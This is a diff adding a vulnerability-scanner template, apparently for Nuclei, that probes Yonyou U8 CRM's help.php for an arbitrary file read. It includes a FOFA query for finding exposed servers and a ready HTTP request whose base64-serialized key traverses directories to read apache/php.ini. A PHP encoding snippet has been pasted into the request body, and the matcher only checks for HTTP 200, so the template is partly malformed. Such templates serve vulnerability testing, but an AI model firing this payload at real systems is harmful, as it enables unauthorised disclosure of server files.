@@ -1,0 +1,19 @@
+id: poc-ph6sedghd4elows1
+info:
+  name: 用友crm客户关系管理help.php存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ph6sedghd4elows1'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ph6sedghd4elows1
+    fofa: body="用友 U8CRM"
+http:
+- raw:
+  - "GET /pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\n\n编码内容\n<?php\n$arr = array(\n    \"/../../../apache/php.ini\",\n    \"1\",\n    \"2\"\n);\n\n$key = base64_encode(serialize($arr));\n\necho $key;\n\n?>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
